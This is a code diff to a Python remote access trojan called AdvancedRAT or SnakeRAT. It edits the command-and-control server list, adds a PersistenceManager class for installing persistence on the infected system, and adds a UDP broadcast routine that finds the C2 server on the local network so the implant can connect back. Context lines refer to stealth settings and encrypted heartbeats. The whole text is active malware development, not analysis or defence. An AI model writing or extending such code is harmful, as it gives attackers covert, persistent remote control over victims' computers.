@@ -66,13 +66,12 @@ else:
     WINDOWS_IMPORTS = False
 
 # Default Configuration (can be overridden via command line)
-C2_HOST = "127.0.0.1"
+# Default Configuration (can be overridden via command line or .env)
+C2_HOST = "127.0.0.1"  # Set this to your Server LAN IP (e.g., 192.168.1.5)
 C2_PORT = 4444
 
 C2_SERVERS = [
-    {"host": C2_HOST, "port": C2_PORT},
-    {"host": "192.168.1.100", "port": 4444},
-    {"host": "10.0.0.1", "port": 4444}
+    {"host": C2_HOST, "port": C2_PORT}, # Defaults to 127.0.0.1
 ]
 
 # Stealth Configuration
@@ -1253,6 +1252,10 @@ $watcher.Stop()
                 }
         except Exception as e:
             return {'error': 'Failed to resolve location'}
+
+class PersistenceManager:
+    """Manages system persistence mechanisms"""
+    
     @staticmethod
     def install_persistence():
         """Install persistence based on platform"""
@@ -2076,11 +2079,42 @@ class AdvancedRAT:
                     try: self._send_encrypted({'type': 'heartbeat'})
                     except: pass
             time.sleep(5)
+    def _discover_server(self):
+        """Broadcast UDP discovery packets to find the server IP on the LAN."""
+        self.logger.info("Broadcasting for C2 server discovery...")
+        discovery_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        discovery_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+        discovery_sock.settimeout(2.0)
+        
+        try:
+            # Broadcast to the whole subnet
+            discovery_sock.sendto(b"SNAKERAT_DISCOVER", ('255.255.255.255', 4445))
+            data, addr = discovery_sock.recvfrom(1024)
+            if data == b"SNAKERAT_OFFER":
+                self.logger.success(f"Discovered C2 server at: {addr[0]}")
+                return addr[0]
+        except Exception:
+            pass
+        finally:
+            discovery_sock.close()
+        return None
+
     def _connection_loop(self):
-        """Main connection loop with failover and mandatory backoff"""
+        """Main connection loop with auto-discovery fallbacks"""
         while self.running:
             try:
+                # 1. Try Auto-Discovery first (only if we don't have a successful discovery yet)
+                discovered_ip = self._discover_server()
+                if discovered_ip:
+                    if not any(s['host'] == discovered_ip for s in C2_SERVERS):
+                        self.logger.info(f"Adding discovered host {discovered_ip} to priority list")
+                        C2_SERVERS.insert(0, {"host": discovered_ip, "port": 4444})
+                else:
+                    self.logger.warning("Auto-discovery failed. Checking fallback servers...")
+                
                 server = C2_SERVERS[self.current_server_index]
+                host = server['host']
+                port = server['port']
                 
                 self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.sock.settimeout(300) # 5m timeout to handle server idle
